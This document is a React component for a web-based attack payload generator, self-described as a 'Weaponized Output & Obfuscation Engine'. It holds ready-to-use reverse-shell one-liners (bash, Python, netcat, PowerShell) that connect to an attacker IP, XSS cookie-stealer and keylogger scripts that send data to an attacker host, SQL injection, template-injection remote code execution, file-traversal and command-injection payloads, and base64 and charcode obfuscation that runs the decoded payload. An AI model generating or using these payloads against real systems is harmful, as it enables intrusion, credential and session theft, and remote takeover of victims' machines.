import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Bomb, Code, Hash, Fingerprint,
    Terminal, Shield, Zap, Search,
    Copy, Check, Info, AlertTriangle,
    FileCode, Database, Globe, RefreshCcw
} from 'lucide-react';
import { useAppContext } from '../../context/AppContext';

const PayloadGenerator = () => {
    const { apiUrl } = useAppContext();
    const [currentTab, setCurrentTab] = useState('xss');
    const [copied, setCopied] = useState(false);
    const [output, setOutput] = useState('');
    const [formData, setFormData] = useState({
        msg: '1',
        attackerIp: '10.10.10.10',
        cmd: 'id',
        seconds: '5',
        file: 'index.php',
        encoding: 'none',
        obfuscate: false
    });

    const revShellTemplates = [
        { name: 'Bash -i', template: 'bash -i >& /dev/tcp/{ATTACKER}/{PORT} 0>&1' },
        { name: 'Python3', template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` },
        { name: 'Netcat -e', template: 'nc -e /bin/sh {ATTACKER} {PORT}' },
        { name: 'Netcat OpenBSD', template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER} {PORT} >/tmp/f' },
        { name: 'Powershell', template: '$client = New-Object System.Net.Sockets.TCPClient("{ATTACKER}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' }
    ];

    const xssTemplates = [
        { name: 'Basic Alert', template: '<script>alert({MSG})</script>' },
        { name: 'IMG Onerror', template: '<img src=x onerror=alert({MSG})>' },
        { name: 'SVG Onload', template: '<svg onload=alert({MSG})>' },
        { name: 'Body Onload', template: '<body onload=alert({MSG})>' },
        { name: 'Input Autofocus', template: '<input onfocus=alert({MSG}) autofocus>' },
        { name: 'Cookie Stealer', template: '<script>new Image().src="http://{ATTACKER}/steal?c="+document.cookie</script>' },
        { name: 'Keylogger', template: '<script>document.onkeypress=function(e){new Image().src="http://{ATTACKER}/log?k="+e.key}</script>' }
    ];

    const sqliTemplates = [
        { name: 'Basic OR', template: "' OR '1'='1" },
        { name: 'Comment', template: "' OR 1=1--" },
        { name: 'Union NULL', template: "' UNION SELECT NULL,NULL,NULL--" },
        { name: 'Union Version', template: "' UNION SELECT @@version,NULL,NULL--" },
        { name: 'Time Based', template: "' AND SLEEP({SECONDS})--" },
        { name: 'Error Based', template: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" }
    ];

    const sstiTemplates = [
        { name: 'Jinja2 Basic', template: '{{7*7}}' },
        { name: 'Jinja2 Config', template: '{{config}}' },
        { name: 'Jinja2 RCE', template: "{{request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read()}}" },
        { name: 'Twig', template: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("{CMD}")}}' },
        { name: 'Freemarker', template: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{CMD}")}' }
    ];

    const lfiTemplates = [
        { name: 'Basic Traversal', template: '../../../etc/passwd' },
        { name: 'Null Byte', template: '../../../etc/passwd%00' },
        { name: 'PHP Wrapper', template: 'php://filter/convert.base64-encode/resource={FILE}' },
        { name: 'Data Wrapper', template: 'data://text/plain;base64,{BASE64_PAYLOAD}' }
    ];

    const cmdTemplates = [
        { name: 'Semicolon', template: '; {CMD}' },
        { name: 'Pipe', template: '| {CMD}' },
        { name: 'AND', template: '&& {CMD}' },
        { name: 'Backtick', template: '`{CMD}`' },
        { name: 'Subshell', template: '$({CMD})' }
    ];

    const generateObfuscated = (payload, type) => {
        if (type === 'xss') {
            // Simple JS Obfuscation (String.fromCharCode)
            return `<script>eval(String.fromCharCode(${payload.replace(/<script>|<\/script>/g, '').split('').map(c => c.charCodeAt(0)).join(',')}))</script>`;
        }
        if (type === 'revshell' && payload.includes('bash')) {
            // Simple Bash Obfuscation (Base64)
            return `echo ${btoa(payload)} | base64 -d | bash`;
        }
        return payload; // Fallback
    };

    const encodings = {
        url: (s) => encodeURIComponent(s),
        doubleUrl: (s) => encodeURIComponent(encodeURIComponent(s)),
        html: (s) => s.split('').map(c => '&#' + c.charCodeAt(0) + ';').join(''),
        base64: (s) => btoa(s),
        hex: (s) => s.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
        unicode: (s) => s.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('')
    };

    const [selectedTemplate, setSelectedTemplate] = useState(0);

    useEffect(() => {
        generatePayload();
    }, [formData, selectedTemplate, currentTab]);

    const generatePayload = () => {
        let templates;
        switch (currentTab) {
            case 'xss': templates = xssTemplates; break;
            case 'sqli': templates = sqliTemplates; break;
            case 'ssti': templates = sstiTemplates; break;
            case 'lfi': templates = lfiTemplates; break;
            case 'cmd': templates = cmdTemplates; break;
            case 'revshell': templates = revShellTemplates; break;
            default: return;
        }

        if (!templates[selectedTemplate]) return;

        let payload = templates[selectedTemplate].template;
        payload = payload.replace(/{MSG}/g, formData.msg);
        payload = payload.replace(/{ATTACKER}/g, formData.attackerIp);
        payload = payload.replace(/{CMD}/g, formData.cmd);
        payload = payload.replace(/{SECONDS}/g, formData.seconds);
        payload = payload.replace(/{FILE}/g, formData.file);
        payload = payload.replace(/{SECONDS}/g, formData.seconds);
        payload = payload.replace(/{FILE}/g, formData.file);
        payload = payload.replace(/{PORT}/g, formData.msg); // Re-use msg as PORT for revshell
        payload = payload.replace(/{BASE64_PAYLOAD}/g, btoa(`<?php system("${formData.cmd}"); ?>`));

        if (formData.obfuscate) {
            payload = generateObfuscated(payload, currentTab);
        }

        if (formData.encoding !== 'none' && encodings[formData.encoding]) {
            payload = encodings[formData.encoding](payload);
        }

        setOutput(payload);
    };

    const handleCopy = () => {
        navigator.clipboard.writeText(output);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const [isObfuscating, setIsObfuscating] = useState(false);

    const handleInputChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    const handleProObfuscate = async () => {
        setIsObfuscating(true);
        try {
            const response = await fetch(`${apiUrl}/tools/obfuscate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    payload: output,
                    method: 'advanced_xor'
                })
            });
            const data = await response.json();
            if (data.success) {
                setOutput(data.payload);
            }
        } catch (error) {
            console.error("Pro obfuscation failed:", error);
        } finally {
            setIsObfuscating(false);
        }
    };

    return (
        <div className="min-h-screen bg-[#0a0a0f] text-gray-100 p-4 md:p-8 font-['Outfit']">
            <div className="max-w-6xl mx-auto">
                {/* Header */}
                <div className="relative mb-12 p-8 rounded-3xl bg-gradient-to-br from-[#12121e] to-[#0a0a0f] border border-red-500/20 overflow-hidden">
                    <div className="absolute top-0 right-0 w-64 h-64 bg-red-500/5 blur-[80px] rounded-full -mr-32 -mt-32" />
                    <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
                        <div>
                            <div className="flex items-center gap-3 mb-2">
                                <div className="p-2 bg-red-500/20 rounded-lg text-red-500">
                                    <Bomb size={24} />
                                </div>
                                <h1 className="text-3xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-red-400 to-orange-400">
                                    Payload Generator
                                </h1>
                            </div>
                            <p className="text-gray-400 text-lg">Weaponized Output & Obfuscation Engine</p>
                        </div>
                        <div className="flex bg-[#1a1a2e] p-1 rounded-xl border border-white/5 overflow-x-auto no-scrollbar">
                            {[
                                { id: 'xss', label: 'XSS' },
                                { id: 'sqli', label: 'SQLi' },
                                { id: 'ssti', label: 'SSTI' },
                                { id: 'lfi', label: 'LFI' },
                                { id: 'cmd', label: 'CMD' },
                                { id: 'revshell', label: 'REV SHELL' },
                            ].map((tab) => (
                                <button
                                    key={tab.id}
                                    onClick={() => {
                                        setCurrentTab(tab.id);
                                        setSelectedTemplate(0);
                                    }}
                                    className={`px-6 py-2 rounded-lg transition-all font-bold text-sm ${currentTab === tab.id
                                        ? 'bg-red-600 text-white shadow-lg shadow-red-500/20'
                                        : 'text-gray-400 hover:text-white hover:bg-white/5'
                                        }`}
                                >
                                    {tab.label}
                                </button>
                            ))}
                        </div>
                    </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                    <div className="lg:col-span-12">
                        <div className="p-8 rounded-3xl bg-[#12121e] border border-white/5 space-y-8">
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                                <div className="space-y-2">
                                    <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Template</label>
                                    <select
                                        value={selectedTemplate}
                                        onChange={(e) => setSelectedTemplate(parseInt(e.target.value))}
                                        className="w-full bg-[#0a0a0f] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500/50 text-white font-medium"
                                    >
                                        {(currentTab === 'xss' ? xssTemplates :
                                            currentTab === 'sqli' ? sqliTemplates :
                                                currentTab === 'ssti' ? sstiTemplates :
                                                    currentTab === 'lfi' ? lfiTemplates :
                                                        currentTab === 'revshell' ? revShellTemplates :
                                                            cmdTemplates).map((t, i) => (
                                                                <option key={i} value={i}>{t.name}</option>
                                                            ))}
                                    </select>
                                </div>

                                <div className="space-y-2">
                                    <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Encoding</label>
                                    <select
                                        name="encoding"
                                        value={formData.encoding}
                                        onChange={handleInputChange}
                                        className="w-full bg-[#0a0a0f] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500/50 text-white font-medium"
                                    >
                                        <option value="none">None</option>
                                        <option value="url">URL Encode</option>
                                        <option value="doubleUrl">Double URL</option>
                                        <option value="html">HTML Entities</option>
                                        <option value="base64">Base64</option>
                                        <option value="hex">Hex (\x)</option>
                                        <option value="unicode">Unicode (\u)</option>
                                    </select>
                                </div>

                                <div className="space-y-2">
                                    <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Obfuscation</label>
                                    <button
                                        onClick={() => setFormData(prev => ({ ...prev, obfuscate: !prev.obfuscate }))}
                                        className={`w-full py-3 rounded-xl border font-bold transition-all ${formData.obfuscate ? 'bg-red-500 text-white border-red-500' : 'bg-[#0a0a0f] text-gray-400 border-white/10'}`}
                                    >
                                        {formData.obfuscate ? 'ENABLED' : 'DISABLED'}
                                    </button>
                                </div>

                                {['xss', 'revshell'].includes(currentTab) && (
                                    <>
                                        <div className="space-y-2">
                                            <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">{currentTab === 'revshell' ? 'Listener Port' : 'Alert Message'}</label>
                                            <input
                                                name="msg"
                                                type="text"
                                                value={formData.msg}
                                                onChange={handleInputChange}
                                                className="w-full bg-[#0a0a0f] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500/50"
                                            />
                                        </div>
                                        <div className="space-y-2">
                                            <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Attacker IP</label>
                                            <input
                                                name="attackerIp"
                                                type="text"
                                                value={formData.attackerIp}
                                                onChange={handleInputChange}
                                                className="w-full bg-[#0a0a0f] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500/50"
                                            />
                                        </div>
                                    </>
                                )}


                                {currentTab === 'sqli' && (
                                    <div className="space-y-2">
                                        <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Sleep Seconds</label>
                                        <input
                                            name="seconds"
                                            type="number"
                                            value={formData.seconds}
                                            onChange={handleInputChange}
                                            className="w-full bg-[#0a0a0f] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500/50"
                                        />
                                    </div>
                                )}

                                {(currentTab === 'ssti' || currentTab === 'cmd') && (
                                    <div className="space-y-2">
                                        <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Command</label>
                                        <input
                                            name="cmd"
                                            type="text"
                                            value={formData.cmd}
                                            onChange={handleInputChange}
                                            className="w-full bg-[#0a0a0f] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500/50"
                                        />
                                    </div>
                                )}

                                {currentTab === 'lfi' && (
                                    <div className="space-y-2">
                                        <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Target File</label>
                                        <input
                                            name="file"
                                            type="text"
                                            value={formData.file}
                                            onChange={handleInputChange}
                                            className="w-full bg-[#0a0a0f] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-red-500/50"
                                        />
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>

                    <div className="lg:col-span-12">
                        <div className="relative group p-8 rounded-[2rem] bg-black/40 border-2 border-red-500/20 hover:border-red-500/40 transition-all overflow-hidden">
                            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-red-500/40 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
                            <div className="flex justify-between items-center mb-6">
                                <h3 className="text-sm font-black text-red-500 uppercase tracking-[0.3em] flex items-center gap-2">
                                    <Terminal size={18} /> GENERATED_PAYLOAD.EXE
                                </h3>
                                <button
                                    onClick={handleCopy}
                                    className={`flex items-center gap-2 px-6 py-2 rounded-xl border transition-all font-bold text-xs uppercase tracking-widest ${copied
                                        ? 'bg-green-600 border-green-500 text-white'
                                        : 'bg-red-600/10 border-red-500/30 text-red-400 hover:bg-red-600 hover:text-white'
                                        }`}
                                >
                                    {copied ? <Check size={14} /> : <Copy size={14} />}
                                    {copied ? 'Copied' : 'Copy Payload'}
                                </button>
                                <button
                                    onClick={handleProObfuscate}
                                    disabled={isObfuscating}
                                    className={`flex items-center gap-2 px-6 py-2 rounded-xl border transition-all font-bold text-xs uppercase tracking-widest ${isObfuscating
                                        ? 'bg-purple-600/30 border-purple-500/30 text-purple-400 opacity-50'
                                        : 'bg-gradient-to-r from-purple-600 to-indigo-600 border-purple-500/50 text-white hover:shadow-lg hover:shadow-purple-500/20'
                                        }`}
                                >
                                    {isObfuscating ? <RefreshCcw size={14} className="animate-spin" /> : <Shield size={14} />}
                                    {isObfuscating ? 'Weaponizing...' : 'Pro Obfuscate'}
                                </button>
                            </div>
                            <div className="bg-[#0a0a0f] rounded-2xl p-6 border border-white/5 font-mono text-lg break-all text-red-400 min-h-[100px] flex items-center shadow-inner">
                                {output}
                            </div>
                        </div>
                    </div>

                    <div className="lg:col-span-12">
                        <div className="space-y-4">
                            <h3 className="text-lg font-bold flex items-center gap-2 px-2">
                                <FileCode size={20} className="text-gray-500" />
                                Template Library
                            </h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                                {(currentTab === 'xss' ? xssTemplates :
                                    currentTab === 'sqli' ? sqliTemplates :
                                        currentTab === 'ssti' ? sstiTemplates :
                                            currentTab === 'lfi' ? lfiTemplates :
                                                currentTab === 'revshell' ? revShellTemplates :
                                                    cmdTemplates).map((t, i) => (
                                                        <div
                                                            key={i}
                                                            onClick={() => setSelectedTemplate(i)}
                                                            className={`p-5 rounded-2xl border cursor-pointer transition-all ${selectedTemplate === i
                                                                ? 'bg-red-500/10 border-red-500/50 shadow-lg shadow-red-500/10'
                                                                : 'bg-[#12121e] border-white/5 hover:border-white/10'
                                                                }`}
                                                        >
                                                            <div className="text-xs font-bold text-gray-500 mb-2 uppercase tracking-tighter">{t.name}</div>
                                                            <code className="text-[10px] text-gray-400 font-mono break-all line-clamp-2">{t.template}</code>
                                                        </div>
                                                    ))}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PayloadGenerator;
